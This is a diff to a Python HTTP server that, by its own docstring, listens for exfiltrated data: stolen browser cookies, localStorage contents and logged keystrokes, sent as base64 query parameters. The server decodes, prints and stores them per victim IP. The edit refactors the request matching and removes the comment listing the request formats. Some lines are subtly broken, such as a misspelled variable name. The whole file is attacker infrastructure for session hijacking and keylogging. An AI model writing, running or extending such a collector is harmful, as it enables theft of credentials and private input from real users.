@@ -1,14 +1,10 @@
 """
- Implements a simple HTTP Server to listen for exfiltrated data.
- Currently stores everything in memory (pointlessly), but primarily dumps it to 
+ Implements a simple HTTP/1.0 Server to listen for exfiltrated data
+ Currently stores everything in memory, but primarily dumps it to 
  the screen.
 
  TODO:  implement saving to file
 
-web requests come in the form of:
-GET /exfil?cookie=<Base64 String> HTTP/1.1
-GET /exfil?data=<Base64 encoded JSON Stringify> HTTP/1.1
-GET /k?key=<Single Character> HTTP/1.1
 """
 
 import socket
@@ -27,10 +23,6 @@ server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server_socket.bind((SERVER_HOST, SERVER_PORT))
 server_socket.listen(1)
 print('Listening on port %s ...' % SERVER_PORT)
-
-# Keyword Variables
-exfilTypes = [ 'exfil', 'k' ]
-dataTypes = [ 'cookie', 'data', 'key' ]
 
 # These data constructs need to track a couple pieces of data.
 # Data and Cookie need to track Host and Data ingested
@@ -60,7 +52,7 @@ while True:
 
     print( f"Connection from: {client_address[0]}" )
 
-    if regResult == None or regResult.group(1) not in exfilTypes or regResult.group(2) not in dataTypes:
+    if regResult == None:
         print( "No useable data" )
         client_connection.close()
         continue
@@ -69,26 +61,26 @@ while True:
     match regResult.group(1):
         # if matchSet 0 = exfil
         # exfil     exfil?
-        case exfilTypes[0]:
+        case "exfil":
             # switch by match 1
             # data      data=
             # cookie    cookie=
             match regResult.group(2):
-                # data is base64 encoded, break it out, 
-                case dataTypes[0]:
-                    cookieExfil[client_address[0]].append( regResult.group(3) )
-                    print( f"Exfiltrated cookie: \n{base64.b64decode(cookieExfile[client_address[0]][-1])}" )
                 # data is base64 encoded, break it out, then JSON prettify it, then print it and store it
-                case dataTypes[1]:
+                case "data":
                     dataExfil[client_address[0]].append( regResult.group(3) )
                     print( f"Exfiltrated localStorage:\n{json.dumps( base64.b64decode(dataExfil[client_address[0]][-1]), indent=2)}" )
+                # data is base64 encoded, break it out, 
+                case "cookie":
+                    cookieExfil[client_address[0]].append( regResult.group(3) )
+                    print( f"Exfiltrated cookie: \n{base64.b64decode(cookieExfile[client_address[0]][-1])}" )
                 case _:
                     print( f"Invalid Exfil value: {regResult.group(2)}\n{regResult.group(3)}" )
         # if matchSet 0 = k
-        case exfilTypes[1]:
+        case "k":
             # keyLog    k?key=
             # verify matchset 1 is key, if no match, continue
-            if( regResult.group(2) != dataTypes[2] ):
+            if( regResult.group(2) != 'key' ):
                 print( f"Invalid keylog value: {regResult.group(2)}\n{regResult.group(3)}" )
                 client_connection.close()
                 continue
